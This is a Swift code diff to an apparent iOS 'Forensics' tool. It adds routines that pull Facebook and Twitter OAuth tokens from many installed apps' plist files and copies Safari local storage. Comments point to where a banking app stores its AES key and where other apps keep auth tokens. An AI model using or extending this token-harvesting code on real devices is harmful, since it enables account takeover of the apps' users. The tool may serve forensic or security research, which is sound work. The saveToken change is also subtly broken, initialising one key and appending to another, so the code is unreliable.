@@ -14,7 +14,7 @@ class Forensics {
 
     let manager = NSFileManager.defaultManager()
 
-    var oauthTokens = Dictionary<String, Dictionary<String, [String]>>()
+    var oauthTokens = Dictionary<String, Dictionary<String, Dictionary<String, [String]>>>()
 
     var emailAccounts = [String]()
 
@@ -52,10 +52,71 @@ class Forensics {
         anyCodes()
         nikePlus()
         friendly()
+        pandora()
+        fitocracy()
+        roomSurfU()
+        heartRateLite()
+        libra()
+        runtasticPullupLite()
+        runtasticPushupLite()
+        runtasticSixPackLite()
+        spotify()
+        snapGrab()
+        viggle()
 
 
 
         finishAnalyzing()
+    }
+
+    func viggle() {
+        pullFacebookAccessTokenFromApp("net.functionxinc.oda", customPath: "Library/Preferences/net.functionxinc.oda-ota.plist")
+    }
+
+    func snapGrab() {
+        //pull tokens from com.toprankapps.snapgrab.plist
+    }
+
+    func spotify() {
+        pullFacebookAccessTokenFromApp("com.spotify.client")
+    }
+
+    func runtasticSixPackLite() {
+        pullFacebookAccessTokenFromApp("com.runtastic.iphone.sixpack.lite")
+    }
+
+    func runtasticPushupLite() {
+        pullFacebookAccessTokenFromApp("com.runtastic.iphone.pushup.lite")
+    }
+
+    func runtasticPullupLite() {
+        pullFacebookAccessTokenFromApp("com.runtastic.iphone.pullup.lite")
+    }
+
+    func libra() {
+        pullFacebookAccessTokenFromApp("com.runtastic.iphone.libra.lite")
+    }
+
+    func heartRateLite() {
+        pullFacebookAccessTokenFromApp("com.runtastic.iphone.heartrate.lite")
+    }
+
+    func roomSurfU() {
+        pullFacebookAccessTokenFromApp("com.roomsurf.joinu")
+    }
+
+    func fitocracy() {
+        pullFacebookAccessTokenFromApp("com.release.fitocracy")
+    }
+
+    //com.regions.mbanking has AES key in Library/KonyDS/KBANKING_KEY
+
+    //check com.reddit.alienblue password code
+
+    func pandora() {
+        //pull auth token from Library/Pandora/store/*auth*
+
+        pullFacebookAccessTokenFromApp("com.pandora")
     }
 
     func friendly() {
@@ -74,7 +135,7 @@ class Forensics {
 
                     if (accountName != nil && token != nil)
                     {
-                        saveToken(token!, forService: .Facebook, forAccount: accountName!)
+                        saveToken(token!, fromApp:"com.oecoway.friendlyLite", forService: .Facebook, forAccount: accountName!)
                     }
                 }
             }
@@ -82,11 +143,11 @@ class Forensics {
     }
 
     func nikePlus() {
-        pullFacebookAccessTokenFromDictionaryAtPath("Library/Preferences/com.nike.nikeplus-gps.plist", forIdentifier: "com.nike.nikeplus")
+        pullFacebookAccessTokenFromApp("com.nike.nikeplus", customPath: "Library/Preferences/com.nike.nikeplus-gps.plist")
     }
 
     func anyCodes() {
-        pullFacebookAccessTokenFromDictionaryAtPath("Library/Preferences/com.mega.mega.AnyCodesN.plist", forIdentifier: "com.mega.mega.AnyCodesN")
+        pullFacebookAccessTokenFromApp("com.mega.mega.AnyCodesN")
     }
 
     func manything() {
@@ -98,7 +159,7 @@ class Forensics {
     }
 
     func jamstar() {
-        pullFacebookAccessTokenFromDictionaryAtPath("Library/Preferences/com.Jamstar.iOS.plist", forIdentifier: "com.Jamstar.iOS")
+        pullFacebookAccessTokenFromApp("com.Jamstar.iOS")
     }
 
     func groupMe() {
@@ -111,7 +172,7 @@ class Forensics {
 
             if (email != nil && token != nil)
             {
-                saveToken(token!, forService: .Facebook, forAccount: email)
+                saveToken(token!, fromApp:"com.groupme.iphone-app", forService: .Facebook, forAccount: email)
             }
         }
     }
@@ -171,15 +232,15 @@ class Forensics {
     }
 
     func duolingo() {
-        pullFacebookAccessTokenFromDictionaryAtPath("Library/Preferences/com.duolingo.DuolingoMobile.plist", forIdentifier: "com.duolingo.DuolingoMobile")
+        pullFacebookAccessTokenFromApp("com.duolingo.DuolingoMobile")
     }
 
     func delta() {
-        pullFacebookAccessTokenFromDictionaryAtPath("Library/Preferences/com.delta.iphone.ver1.plist", forIdentifier: "com.delta.iphone.ver1")
+        pullFacebookAccessTokenFromApp("com.delta.iphone.ver1")
     }
 
     func peak() {
-        pullFacebookAccessTokenFromDictionaryAtPath("Library/Preferences/com.brainbow.peakprod.plist", forIdentifier: "com.brainbow.peakprod")
+        pullFacebookAccessTokenFromApp("com.brainbow.peakprod")
     }
 
     func btSync() {
@@ -209,7 +270,7 @@ class Forensics {
                 let username = account["username"]! as String
                 let token = account["oAuthToken"]! as String
 
-                saveToken(token, forService: .Twitter, forAccount: username)
+                saveToken(token, fromApp:"com.atebits.Tweetie2", forService: .Twitter, forAccount: username)
             }
         }
     }
@@ -267,7 +328,11 @@ class Forensics {
         }
 
         //Local storage
-        manager.copyItemAtPath(pathForApplication(identifier: "com.apple.mobilesafari")! + "/Library/WebKit/WebsiteData/LocalStorage/", toPath: interestingDirectory + "/Safari/LocalStorage", error: nil)
+        let safariPath = pathForApplication(identifier: "com.apple.mobilesafari")
+        if (safariPath != nil)
+        {
+            manager.copyItemAtPath(safariPath! + "/Library/WebKit/WebsiteData/LocalStorage/", toPath: interestingDirectory + "/Safari/LocalStorage", error: nil)
+        }
     }
 
 
@@ -303,7 +368,7 @@ class Forensics {
     }
 
     func memrise() {
-        pullFacebookAccessTokenFromDictionaryAtPath("Library/Preferences/com.memrise.ios.memrisecompanion.plist", forIdentifier: "com.memrise.ios.memrisecompanion")
+        pullFacebookAccessTokenFromApp("com.memrise.ios.memrisecompanion")
     }
 
     func finishAnalyzing() {
@@ -333,19 +398,19 @@ class Forensics {
         }
     }
 
-    func saveToken(token: String, forService service: Services) {
-        saveToken(token, forService: service.rawValue, forAccount: nil)
+    func saveToken(token: String, fromApp identifier:String, forService service: Services) {
+        saveToken(token, fromApp: identifier, forService: service.rawValue, forAccount: nil)
     }
 
-    func saveToken(token: String, forService service: String) {
-        saveToken(token, forService: service, forAccount: nil)
+    func saveToken(token: String, fromApp identifier: String, forService service: String) {
+        saveToken(token, fromApp: identifier, forService: service, forAccount: nil)
     }
 
-    func saveToken(token: String, forService service: Services, forAccount account:String?) {
-        saveToken(token, forService: service.rawValue, forAccount: account)
+    func saveToken(token: String, fromApp identifier: String, forService service: Services, forAccount account:String?) {
+        saveToken(token, fromApp: identifier, forService: service.rawValue, forAccount: account)
     }
 
-    func saveToken(token: String, forService service: String, forAccount account:String?) {
+    func saveToken(token: String, fromApp identifier: String, forService service: String, forAccount account:String?) {
 
         //default username for unidentified tokens
         var user = account
@@ -358,15 +423,18 @@ class Forensics {
         //make sure nothing is nil and going to crash
         if (oauthTokens[service] == nil)
         {
-            oauthTokens[service] = Dictionary<String, [String]>()
+            oauthTokens[service] = Dictionary<String, Dictionary<String, [String]>>()
         }
         if (oauthTokens[service]![user!] == nil)
         {
-            oauthTokens[service]![user!] = [String]()
+            oauthTokens[service]![user!] = Dictionary<String, [String]>()
+        }
+        if (oauthTokens[service]![user!]![service] == nil)
+        {
+            oauthTokens[service]![user!]![service] = [String]()
         }
 
-
-        oauthTokens[service]![user!]!.append(token)
+        oauthTokens[service]![user!]![identifier]!.append(token)
     }
 
     func dictionaryFromPath(relativePath: String, forIdentifier identifier: String) -> NSDictionary? {
@@ -403,7 +471,20 @@ class Forensics {
         return path
     }
 
-    func pullFacebookAccessTokenFromDictionaryAtPath(path: String, forIdentifier identifier: String) {
+    func pullFacebookAccessTokenFromApp(identifier: String)
+    {
+        //Can't use default value because path depends on identifier
+        pullFacebookAccessTokenFromApp(identifier, customPath: nil)
+    }
+
+    func pullFacebookAccessTokenFromApp(identifier: String, customPath: String?) {
+        var path = "Library/Preferences/\(identifier).plist"
+
+        if (customPath != nil)
+        {
+            path = customPath!
+        }
+
         let dict = dictionaryFromPath(path, forIdentifier: identifier)
 
         if (dict != nil)
@@ -418,7 +499,7 @@ class Forensics {
                 {
 
 
-                    saveToken(token!, forService: .Facebook)
+                    saveToken(token!, fromApp:identifier, forService: .Facebook)
                 }
             }
         }
